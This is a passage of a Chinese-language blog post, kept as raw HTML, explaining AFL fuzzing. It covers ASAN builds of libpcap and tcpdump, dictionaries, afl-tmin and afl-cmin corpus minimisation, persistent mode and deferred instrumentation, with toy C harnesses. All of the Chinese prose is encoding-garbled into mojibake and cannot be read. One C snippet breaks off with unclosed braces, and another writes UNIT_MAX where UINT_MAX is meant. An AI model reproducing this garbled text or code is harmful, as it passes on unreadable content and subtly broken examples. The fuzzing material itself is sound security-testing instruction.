ˆã€3. æ­£åœ¨æ‰§è¡Œçº¿ç¨‹çš„å¯„å­˜å™¨ã€4. TLS ä¸­å­˜æ”¾çš„æ•°æ®ã€‚è¿™äº›å†…å­˜åœ°å€ä¸­çš„å€¼ä¼šå½¢æˆ root setã€‚ä¹‹åï¼ŒLSAN ä¼šæ£€æŸ¥ root set çš„å€¼æ˜¯å¦æŒ‡å‘ heap block çš„æŒ‡é’ˆï¼Œå¹¶ä¸”è¯¥å—å†…å­˜ä»æ˜¯æ´»è·ƒçš„ï¼Œè¡¨ç¤ºä»åœ¨è¢«ä½¿ç”¨ã€‚</p><p>è¦å¯ç”¨ASANï¼Œè¯·åœ¨æ‰§è¡Œ<code>make clean all</code>ä¹‹å‰è®¾ç½®<code>AFL_USE_ASAN=1</code>ã€‚<code>afl-gcc</code> &#x2F; <code>afl-clang</code>åŒ…è£…å™¨ä¼šè‡ªåŠ¨æ·»åŠ é€‚å½“çš„æ ‡å¿—ã€‚è¯·æ³¨æ„ï¼ŒASANä¸<code>-static</code>ä¸å…¼å®¹ï¼Œå› æ­¤éœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚</p><ul><li>ç¼–è¯‘æ’æ¡©</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd $HOME/fuzzing_tcpdump/libpcap-1.8.0/<br>export LLVM_CONFIG=&quot;llvm-config-11&quot;<br>CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;<br>AFL_USE_ASAN=1 make<br><br>cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡å¯åŠ¨ASan</span><br>AFL_USE_ASAN=1 CC=afl-clang-lto ./configure --prefix=&quot;$HOME/fuzzing_tcpdump/install/&quot;<br>AFL_USE_ASAN=1 make<br>AFL_USE_ASAN=1 make install<br></code></pre></td></tr></table></figure><h3 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h3><p>å½“æˆ‘ä»¬æƒ³è¦å¯¹å¤æ‚çš„åŸºäºæ–‡æœ¬çš„æ ¼å¼æ–‡ä»¶ï¼ˆå¦‚ XMLï¼‰è¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨ä¸€ä¸ªåŒ…å«åŸºæœ¬è¯­æ³•æ ‡è®°çš„å­—å…¸ã€‚åœ¨ AFL ä¸­ï¼Œå­—å…¸æ˜¯ä¸€ç»„é¢„å®šä¹‰çš„ã€å…·æœ‰ç‰¹æ®Šæ ¼å¼å«ä¹‰çš„å­—æ®µï¼ˆå¦‚ XML æ ‡ç­¾ç­‰ï¼‰ã€‚</p><p>AFL åˆ©ç”¨è¿™äº›å­—æ®µå¯¹æµ‹è¯•è¾“å…¥è¿›è¡Œå˜å¼‚æ“ä½œï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li>è¦†ç›–ï¼šä½¿ç”¨å­—å…¸ä¸­çš„æŸä¸ªå­—æ®µæ›¿æ¢è¾“å…¥æ–‡ä»¶ä¸­æŒ‡å®šä½ç½®çš„å­—èŠ‚ï¼Œæ›¿æ¢é•¿åº¦ä¸å­—æ®µé•¿åº¦ä¸€è‡´ã€‚</li><li>æ’å…¥ï¼šå°†å­—å…¸å­—æ®µæ’å…¥åˆ°æ–‡ä»¶å½“å‰ä½ç½®ï¼ŒåŸæœ‰å†…å®¹å‘åç§»åŠ¨ï¼Œå¯¼è‡´æ–‡ä»¶å¤§å°å¢åŠ ã€‚</li></ul><p>å­—å…¸å¯ä»¥å¸®åŠ© AFL åœ¨å˜å¼‚è¿‡ç¨‹ä¸­ç”Ÿæˆæ›´ç¬¦åˆç›®æ ‡æ ¼å¼è§„èŒƒçš„æµ‹è¯•ç”¨ä¾‹ï¼Œä»è€Œæé«˜æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡å’Œæœ‰æ•ˆæ€§ã€‚åœ¨ AFL é¡¹ç›®çš„<code>dictionaries</code>ç›®å½•ä¸‹å°±å­˜æ”¾ç€å¾ˆå¤šæ ¼å¼çš„å­—å…¸æ–‡ä»¶ã€‚</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/Pasted%20image%2020250420213106.png"></p><h3 id="è¯­æ–™ä¼˜åŒ–"><a href="#è¯­æ–™ä¼˜åŒ–" class="headerlink" title="è¯­æ–™ä¼˜åŒ–"></a>è¯­æ–™ä¼˜åŒ–</h3><p>æœ€å°åŒ–æµ‹è¯•ç”¨ä¾‹</p><p>æ–‡ä»¶å¤§å°å¯¹æ¨¡ç³Šæµ‹è¯•æ€§èƒ½æœ‰æ˜¾è‘—å½±å“ï¼Œä¸»è¦å› ä¸ºå¤§æ–‡ä»¶ä¼šä½¿ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºè¿è¡Œå˜æ…¢ï¼ŒåŒæ—¶ä¹Ÿå‡å°‘äº†çªå˜æ“ä½œè§¦åŠé‡è¦æ ¼å¼æ§åˆ¶ç»“æ„çš„å¯èƒ½æ€§ï¼Œè€Œè¿™äº›ç»“æ„å¯èƒ½ä¼šè¢«å†—ä½™æ•°æ®å—è¦†ç›–ã€‚</p><p>é™¤äº†ç”¨æˆ·å¯èƒ½æä¾›ä½è´¨é‡çš„åˆå§‹æµ‹è¯•ç”¨ä¾‹å¤–ï¼Œæœ‰äº›ç±»å‹çš„çªå˜å¯èƒ½ä¼šå¯¼è‡´ç”Ÿæˆçš„æ–‡ä»¶é€æ¸å˜å¤§ï¼Œå› æ­¤å¿…é¡»é‡‡å–æªæ–½æ¥æŠµæ¶ˆè¿™ç§è¶‹åŠ¿ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œä»ªå™¨åé¦ˆæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥è‡ªåŠ¨ä¿®å‰ªè¾“å…¥æ–‡ä»¶ï¼ŒåŒæ—¶ç¡®ä¿æ–‡ä»¶æ‰€åšçš„ä¿®æ”¹ä¸ä¼šå½±å“æ‰§è¡Œè·¯å¾„ã€‚</p><p>å†…ç½®çš„ AFL ä¿®å‰ªå·¥å…·ï¼ˆtrimmerï¼‰å°è¯•é¡ºåºåˆ é™¤å…·æœ‰å¯å˜é•¿åº¦å’Œæ­¥å¹…çš„æ•°æ®å—ï¼›ä»»ä½•ä¸ä¼šå½±å“æ‰§è¡Œè·¯å¾„çš„åˆ é™¤éƒ½ä¼šè¢«ä¿å­˜åˆ°ç£ç›˜ã€‚è¿™ä¸ªä¿®å‰ªå™¨å¹¶ä¸æ˜¯ç‰¹åˆ«å½»åº•ï¼›ç›¸åï¼Œå®ƒåŠ›æ±‚åœ¨ç²¾ç¡®åº¦å’Œæ‰§è¡Œè¿‡ç¨‹ä¸­çš„<code>execve()</code>è°ƒç”¨æ¬¡æ•°ä¹‹é—´æ‰¾åˆ°å¹³è¡¡ï¼Œé€‰æ‹©åˆé€‚çš„å—å¤§å°å’Œæ­¥å¹…ã€‚æ¯ä¸ªæ–‡ä»¶çš„å¹³å‡ä¿®å‰ªå¢ç›Šå¤§çº¦ä¸º5-20%ã€‚</p><p>ç‹¬ç«‹çš„<code>afl-tmin</code>å·¥å…·ä½¿ç”¨æ›´ä¸ºè¯¦å°½çš„è¿­ä»£ç®—æ³•ï¼Œå¹¶å°è¯•å¯¹ä¿®å‰ªåçš„æ–‡ä»¶è¿›è¡Œå­—æ¯è¡¨æ ‡å‡†åŒ–ã€‚<code>afl-tmin</code>çš„å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆï¼Œå·¥å…·ä¼šè‡ªåŠ¨é€‰æ‹©æ“ä½œæ¨¡å¼ã€‚å¦‚æœåˆå§‹è¾“å…¥å¯¼è‡´ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºå´©æºƒï¼Œ<code>afl-tmin</code>å°†åœ¨æœªåŠ ä»ªå™¨çš„æ¨¡å¼ä¸‹è¿è¡Œï¼Œä»…ä¿ç•™é‚£äº›èƒ½å¤Ÿç®€åŒ–æ–‡ä»¶ä½†ä»å¯¼è‡´å´©æºƒçš„ä¿®æ”¹ã€‚å¦‚æœç›®æ ‡ç¨‹åºæ²¡æœ‰å´©æºƒï¼Œåˆ™ä½¿ç”¨åŠ ä»ªå™¨çš„æ¨¡å¼ï¼Œåªä¿ç•™é‚£äº›èƒ½å¤Ÿäº§ç”Ÿå®Œå…¨ç›¸åŒæ‰§è¡Œè·¯å¾„çš„ä¿®æ”¹ã€‚</p><p>å®é™…çš„æœ€å°åŒ–ç®—æ³•ä¸ºï¼š</p><ol><li>å°è¯•å°†å¤§æ•°æ®å—ç½®é›¶å¹¶ä½¿ç”¨å¤§æ­¥å¹…ã€‚é€šè¿‡ç»éªŒï¼Œè¿™èƒ½å¤Ÿé€šè¿‡é¢„å…ˆå¤„ç†è¾ƒå¤§çš„ä¿®æ”¹ï¼Œé¿å…åç»­ç»†ç²’åº¦æ“ä½œä¸­é¢‘ç¹çš„<code>exec</code>è°ƒç”¨ã€‚</li><li>é€šè¿‡é€æ­¥å‡å°‘å—å¤§å°å’Œæ­¥å¹…ï¼ˆç±»ä¼¼äºŒåˆ†æŸ¥æ‰¾ï¼‰è¿›è¡Œå—åˆ é™¤æ“ä½œã€‚</li><li>é€šè¿‡è®¡ç®—å”¯ä¸€å­—ç¬¦å¹¶å°è¯•å°†æ¯ä¸ªå­—ç¬¦æ›¿æ¢ä¸ºé›¶å€¼ï¼Œæ‰§è¡Œå­—æ¯è¡¨æ ‡å‡†åŒ–ã€‚</li><li>æœ€åï¼Œé’ˆå¯¹éé›¶å­—èŠ‚æ‰§è¡Œé€å­—èŠ‚æ ‡å‡†åŒ–ã€‚</li></ol><p><code>afl-tmin</code>ä½¿ç”¨ASCIIæ•°å­—<code>0</code>è€Œä¸æ˜¯<code>0x00</code>æ¥ç½®é›¶ã€‚è¿™æ˜¯å› ä¸ºè¿™ç§ä¿®æ”¹æ›´ä¸å®¹æ˜“å¹²æ‰°æ–‡æœ¬è§£æï¼Œå› æ­¤æ›´æœ‰å¯èƒ½æˆåŠŸç®€åŒ–æ–‡æœ¬æ–‡ä»¶ã€‚</p><p>è¯¥ç®—æ³•æ²¡æœ‰ä¸€äº›å­¦æœ¯ç ”ç©¶æå‡ºçš„å¤æ‚æµ‹è¯•ç”¨ä¾‹æœ€å°åŒ–æ–¹æ³•ï¼Œä½†éœ€è¦çš„æ‰§è¡Œæ¬¡æ•°è¿œå°‘ï¼Œä¸”åœ¨å¤§å¤šæ•°å®é™…åº”ç”¨ä¸­äº§ç”Ÿçš„ç»“æœå¯æ¯”ã€‚</p><p>å¯¹ç”¨ä¾‹è¿›è¡Œè£å‰ªï¼Œafl-tmin ç”¨äºå¯¹å•ä¸ªæ ·æœ¬çš„è£å‰ªï¼Œafl-cminç”¨äºå¯¹æ ·æœ¬é›†åˆçš„è£å‰ªï¼Œå°†è·¯å¾„ç›¸åŒçš„æ ·æœ¬åˆ é™¤åªä¿ç•™ä¸€ä¸ª</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡ä»¤æ ¼å¼ï¼š afl-cmin -i æ ·æœ¬ç›®å½• -o è¾“å‡ºç›®å½• [-Q] -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡ä»¤æ ¼å¼ï¼š afl-tmin -i æ ·æœ¬æ–‡ä»¶ -o è¾“å‡ºæ–‡ä»¶ [-Q] -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å…¶ä¸­ <span class="hljs-string">&#x27;è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº&#x27;</span> å¿…é¡»æ˜¯å¸¦æœ‰è·¯å¾„çš„ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ <span class="hljs-string">&#x27;djpeg 1.jpeg&#x27;</span> å¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯fuzzæ—¶å¿…é¡»å°† <span class="hljs-string">&#x27;djpeg&#x27;</span> çš„è·¯å¾„ä¸€å¹¶å¸¦ä¸Šæ‰å¯ä»¥ï¼Œå³ <span class="hljs-string">&#x27;/usr/bin/djpeg&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">é»˜è®¤æƒ…å†µä¸‹afl-cminå’Œafl-tminä¼šæŠŠæ ·æœ¬ä»¥æ ‡å‡†è¾“å‡ºçš„æ–¹å¼å–‚ç»™è¦fuzzçš„ç¨‹åºï¼Œå¦‚æœfuzzç¨‹åºæ˜¯ä»å‚æ•°æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–æ•°æ®è¿›è¡Œå¤„ç†çš„ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <span class="hljs-string">&#x27;@@&#x27;</span> æ¥ä»£æ›¿è¾“å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚åŸæœ¬æ‰§è¡Œçš„æŒ‡ä»¤ä¸º <span class="hljs-string">&#x27;djpeg in_afl_min/1.jpeg&#x27;</span> ï¼Œfuzzæ—¶æŒ‡ä»¤åº”ä¸º <span class="hljs-string">&#x27;/usr/bin/djpeg @@&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">åœ¨å®‰è£…äº†qemu-modeæ—¶ï¼Œå¯ä»¥æ”¯æŒ <span class="hljs-string">&#x27;-Q&#x27;</span> é€‰é¡¹ï¼Œå¦‚æœç›®æ ‡å¯æ‰§è¡Œç¨‹åº</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å½“ç„¶è¿™ä¸¤ä¸ªæŒ‡ä»¤è¿˜æœ‰ä¸€äº›å…¶å®ƒå‚æ•°ï¼Œè¿™é‡Œå°±ä¸ä»‹ç»ä½¿ç”¨äº†ï¼Œä»¥ä¸Šä¸ºå¸¸è§ç”¨æ³•</span><br><br>afl-cmin -i in_afl -o in_afl_min -Q -- /usr/bin/djpeg @@<br>afl-tmin -i in_afl_min/1.jpeg -o in_afl_min/1_new.jpeg -Q -- /usr/bin/djpeg @@<br></code></pre></td></tr></table></figure><h3 id="æŒä¹…æ¨¡å¼"><a href="#æŒä¹…æ¨¡å¼" class="headerlink" title="æŒä¹…æ¨¡å¼"></a>æŒä¹…æ¨¡å¼</h3><p>AFL çš„é»˜è®¤è¡Œä¸ºæ˜¯æ¯æ¬¡æµ‹è¯•ä¸€ä¸ªæ–°çš„è¾“å…¥æ ·æœ¬æ—¶å°± fork ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚è¿™å¯¹å¯åŠ¨é€Ÿåº¦è¾ƒæ…¢çš„ç¨‹åºï¼ˆæ¯”å¦‚å¤§å‹ç¨‹åºï¼‰æ•ˆç‡è¾ƒä½ã€‚</p><p>æŒä¹…åŒ–æ¨¡å¼ï¼ˆPersistent Modeï¼‰ æ˜¯ AFL æä¾›çš„ä¸€ç§å¯ä»¥åŠ å¿« Fuzz æ‰§è¡Œé€Ÿåº¦çš„åŠŸèƒ½ã€‚æŒä¹…åŒ–æ¨¡å¼åŸºäºè¿›ç¨‹å†…æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼æå‡æ•ˆç‡ï¼š</p><ul><li>åœ¨å•ä¸ªè¿›ç¨‹ä¸­å¤šæ¬¡æ‰§è¡Œæµ‹è¯•ï¼ˆè€Œéæ¯æ¬¡ fork æ–°è¿›ç¨‹ï¼‰</li><li>åª fork ä¸€æ¬¡ï¼Œå¾ªç¯æ‰§è¡Œç›®æ ‡ä»£ç ï¼Œæ¯æ¬¡å¤„ç†ä¸€ä¸ªè¾“å…¥ã€‚</li><li>å¤§å¹…å‡å°‘è¿›ç¨‹åˆ›å»ºä¸é”€æ¯çš„å¼€é”€ã€‚</li><li>é€Ÿåº¦å¯æå‡é«˜è¾¾20å€</li></ul><p>ç®€å•ç†è§£ä¸ºæ— éœ€æ¯æ¬¡éƒ½è¿›è¡Œ fork æ“ä½œï¼Œè€Œåªæ˜¯åœ¨ç¨‹åºçš„æŸä¸€ç‰¹å®šä½ç½®è¿›è¡Œå¾ªç¯ fuzzã€‚</p><p>åŸºæœ¬ä»£ç ç»“æ„ï¼š</p><p>é…ç½®æŒä¹…æ¨¡å¼çš„ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>ä½¿ç”¨<code>__AFL_LOOP()</code>å®</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ç¨‹åºåˆå§‹åŒ–  </span><br><span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">10000</span>)) &#123;  <br> Â <span class="hljs-comment">/* è¯»å–è¾“å…¥æ•°æ® */</span>  <br> Â <span class="hljs-comment">/* è°ƒç”¨å¾…æµ‹è¯•åº“ä»£ç  */</span>   <br> Â <span class="hljs-comment">/* é‡ç½®çŠ¶æ€ */</span>  <br>&#125;  <br><span class="hljs-comment">// æµ‹è¯•ç»“æŸ</span><br></code></pre></td></tr></table></figure><ul><li>é€šè¿‡å®æ’å…¥</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_COMPILER</span><br>  <span class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">10000</span>))&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ç¼–è¯‘å™¨é€‰é¡¹</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash">AFL_USE_ASAN=1 AFL_LLVM_PERSISTENT_ADDR=main afl-clang-fast -o target target.c</span><br></code></pre></td></tr></table></figure><ul><li><code>AFL_LLVM_PERSISTENT_ADDR=main</code>ï¼šæŒ‡å®šæŒä¹…åŒ–æ¨¡å¼çš„å‡½æ•°å…¥å£ç‚¹ï¼Œè®© AFL ä»<code>main</code>å‡½æ•°å¼€å§‹è¿›è¡ŒæŒä¹…åŒ–æ¨¡å¼æ’æ¡©ã€‚</li></ul><p>Fuzz ä¸€ä¸ªé¡¹ç›®å“ªäº›åœ°æ–¹éœ€è¦å¯åŠ¨æŒä¹…æ¨¡å¼ï¼Ÿ</p><h3 id="å»¶è¿Ÿæ’æ¡©"><a href="#å»¶è¿Ÿæ’æ¡©" class="headerlink" title="å»¶è¿Ÿæ’æ¡©"></a>å»¶è¿Ÿæ’æ¡©</h3><p><strong>æ’æ¡©ä¼˜åŒ–</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-comment">/* Main entry point. */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">/* Example-only buffer, you&#x27;d replace it with other global or</span><br><span class="hljs-comment">                    local variables appropriate for your use case. */</span><br><br>  <span class="hljs-comment">/* The number passed to __AFL_LOOP() controls the maximum number of</span><br><span class="hljs-comment">     iterations before the loop exits and the program is allowed to</span><br><span class="hljs-comment">     terminate normally. This limits the impact of accidental memory leaks</span><br><span class="hljs-comment">     and similar hiccups. */</span><br><br>  <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br><br>    <span class="hljs-comment">/*** PLACEHOLDER CODE ***/</span><br><br>    <span class="hljs-comment">/* STEP 1: Fully re-initialize all critical variables. In our example, this</span><br><span class="hljs-comment">               involves zeroing buf[], our input buffer. */</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br><br>    <span class="hljs-comment">/* STEP 2: Read input data. When reading from stdin, no special preparation</span><br><span class="hljs-comment">               is required. When reading from a named file, you need to close</span><br><span class="hljs-comment">               the old descriptor and reopen the file first!</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">               Beware of reading from buffered FILE* objects such as stdin. Use</span><br><span class="hljs-comment">               raw file descriptors or call fopen() / fdopen() in every pass. */</span><br><br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">100</span>);<br><br>    <span class="hljs-comment">/* STEP 3: This is where we&#x27;d call the tested library on the read data.</span><br><span class="hljs-comment">               We just have some trivial inline code that faults on &#x27;foo!&#x27;. */</span><br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;one\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;two\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;o&#x27;</span>) &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;three\n&quot;</span>);<br>          <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;!&#x27;</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;four\n&quot;</span>);<br>            <span class="hljs-built_in">abort</span>();<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/*** END PLACEHOLDER CODE ***/</span><br><br>  &#125;<br><br>  <span class="hljs-comment">/* Once the loop is exited, terminate normally - AFL will restart the process</span><br><span class="hljs-comment">     when this happens, with a clean slate when it comes to allocated memory,</span><br><span class="hljs-comment">     leftover file descriptors, etc. */</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-type">ssize_t</span> len;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br><br>__AFL_INIT();<br><span class="hljs-keyword">while</span>(__AFL_LOOP(UINT_MAX))&#123;<br><span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">100</span>);<br><br>len=read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">100</span>);<br><span class="hljs-keyword">if</span>(len &lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;f&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;one\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;o&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;two\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">2</span>]==<span class="hljs-string">&#x27;o&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;three\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">3</span>]==<span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;four\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">4</span>]==<span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;five\n&quot;</span>);<br><span class="hljs-keyword">if</span>(buf[<span class="hljs-number">5</span>]==<span class="hljs-string">&#x27;!&#x27;</span>)&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;six\n&quot;</span>);<br><span class="hljs-built_in">abort</span>();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å»¶è¿Ÿæ’æ¡©ï¼Œåœ¨ç¨‹åºè¿è¡Œçš„èµ·ç‚¹ç›´æ¥å¯åŠ¨ forkserverï¼Œå½“ afl éœ€è¦åˆ›å»ºå­è¿›ç¨‹æ—¶å°±ä»è¿™é‡Œ fork ä¸€ä¸ªå­è¿›ç¨‹ã€‚</p><p>å°†<code>__AFL_INIT()</code>æ”¾åœ¨å“ªé‡Œï¼Œç›¸å½“äºæŒ‡å®šforkserveråœ¨å“ªé‡Œç”Ÿæˆã€‚æ¯”å¦‚å°†å…¶æ”¾åœ¨æ— æ„ä¹‰æºç çš„ä¸‹æ–¹ï¼Œè¿™æ ·aflä¼šç›´æ¥ç•¥è¿‡æ— æ„ä¹‰çš„ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__AFL_INIT();<br><span class="hljs-keyword">while</span>(__AFL_LOOP(UNIT_MAX))<br></code></pre></td></tr></table></figure><p>åœ¨ä¸€æ¬¡å­è¿›ç¨‹æ¥æ”¶å¤šæ¬¡æ ·æœ¬çš„æŠ•å–‚ã€‚</p><p><code>__AFL_LOOP</code>ã€‚</p><p><img 